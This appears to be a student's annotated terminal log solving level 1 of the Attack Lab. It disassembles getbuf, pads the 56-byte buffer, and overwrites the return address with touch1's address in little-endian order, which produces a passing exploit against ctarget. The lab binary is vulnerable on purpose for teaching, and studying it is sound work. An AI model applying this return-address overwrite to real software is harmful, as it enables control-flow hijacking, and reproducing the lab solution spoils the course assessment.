(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x000000000040188b <+0>:     sub    $0x38,%rsp         //This tells us that the buffer size is 56 in decimal form
   0x000000000040188f <+4>:     mov    %rsp,%rdi
   0x0000000000401892 <+7>:     callq  0x401ac3 <Gets>
   0x0000000000401897 <+12>:    mov    $0x1,%eax
   0x000000000040189c <+17>:    add    $0x38,%rsp
   0x00000000004018a0 <+21>:    retq
End of assembler dump.
(gdb) quit
[osbe@cdmcscspprd01 target17]$ ls
cookie.txt  ctarget  farm.c  hex2raw  input.txt  input.txt~  README.txt  rtarget                //let's find our input file where we will overwrite the return add
[osbe@cdmcscspprd01 target17]$ emacs input.txt
/* I have populated input.txt as follows (the address of touch1 is 0x4018a1)
   Notice the reversal of the address accounting for little endian input in x86-64

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a1 18 40 00 00 00 00 00
*/

[osbe@cdmcscspprd01 target17]$ ./hex2raw < input.txt > input-raw.txt
[osbe@cdmcscspprd01 target17]$ ls
cookie.txt  ctarget  farm.c  hex2raw  input-raw.txt  input.txt  input.txt~  README.txt  rtarget
[osbe@cdmcscspprd01 target17]$ ./ctarget < input-raw.txt
Cookie: 0x76ebdb56
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
